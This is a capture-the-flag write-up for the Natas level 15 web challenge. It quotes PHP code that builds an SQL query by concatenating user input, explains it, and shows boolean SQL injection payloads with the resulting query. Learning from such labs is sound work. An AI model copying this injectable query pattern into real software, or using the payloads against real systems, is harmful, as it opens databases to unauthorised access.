# Level 15

## Software used
- Google Chrome + FoxyProxy
- Burpsuite Community
- [onlinephp.io](https://onlinephp.io/)

## Hint
```php
<?php

/*
CREATE TABLE `users` (
  `username` varchar(64) DEFAULT NULL,
  `password` varchar(64) DEFAULT NULL
);
*/

if(array_key_exists("username", $_REQUEST)) {
    $link = mysqli_connect('localhost', 'natas15', '<censored>');
    mysqli_select_db($link, 'natas15');

    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
    if(array_key_exists("debug", $_GET)) {
        echo "Executing query: $query<br>";
    }

    $res = mysqli_query($link, $query);
    if($res) {
    if(mysqli_num_rows($res) > 0) {
        echo "This user exists.<br>";
    } else {
        echo "This user doesn't exist.<br>";
    }
    } else {
        echo "Error in query.<br>";
    }

    mysqli_close($link);
} else {
?>

<form action="index.php" method="POST">
Username: <input name="username"><br>
<input type="submit" value="Check existence" />
</form>
<?php } ?>
```

## Solution

### Code Analysis

```
/*
CREATE TABLE `users` (
  `username` varchar(64) DEFAULT NULL,
  `password` varchar(64) DEFAULT NULL
);
*/
```
It is actually a comment but it may be useful since it gives us a clue about the maximum length of usernames and passwords, and that the default value if NULL.  
[VARCHAR](https://dev.mysql.com/doc/refman/8.0/en/char.html): The CHAR and VARCHAR types are similar, but differ in the way they are stored and retrieved. They also differ in maximum length and in whether trailing spaces are retained.  
[MYSQL DEFAULT VALUE](https://dev.mysql.com/doc/refman/8.0/en/data-type-defaults.html)
```php
if(array_key_exists("username", $_REQUEST)) {
    $link = mysqli_connect('localhost', 'natas15', '<censored>');
    mysqli_select_db($link, 'natas15');
```
If key _username_ exists in the special array $\_REQUEST, then connect to the database _natas15_ on localhost (local to the server) using the username _natas15_ and password... which is censored.  

```php
$query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
    if(array_key_exists("debug", $_GET)) {
        echo "Executing query: $query<br>";
    }
```
Create the variable $query which holds the actual SQL query to be sent to the backend database.  

```php
$res = mysqli_query($link, $query);
    if($res) {
    if(mysqli_num_rows($res) > 0) {
        echo "This user exists.<br>";
    } else {
        echo "This user doesn't exist.<br>";
    }
    } else {
        echo "Error in query.<br>";
    }

    mysqli_close($link);
} else {
?>
```

The variable $res holds the response from the backend database:
- if the number of rows ([mysqli_num_rows](https://www.php.net/manual/en/mysqli-result.num-rows.php)) is greater than 0, then prints to screen ""This user exists.\<br>"
- if the number of rows is 0 or a negative integer, then prints "This user doesn't exist.\<br>"
- if the result is everything else, prints "Error in query.\<br>"

At the end of the script, the connection to the database is closed.

## Exploit

Injecting the payload `" OR 1=1-- ` the app prints to screen **This user exists.**. By contrast, using the payload `" OR 1=2-- ` we get **This user doesn't exist.**.
```php
<?php

$array = array(
	
	"username" => '" OR 1=1-- ',
	/*"password" => '" OR 1=1-- ',*/
);

$query = "SELECT * from users where username=\"".$array["username"]."\"";

echo $query

?>
_____

SELECT * from users where username="" OR 1=1-- "
```
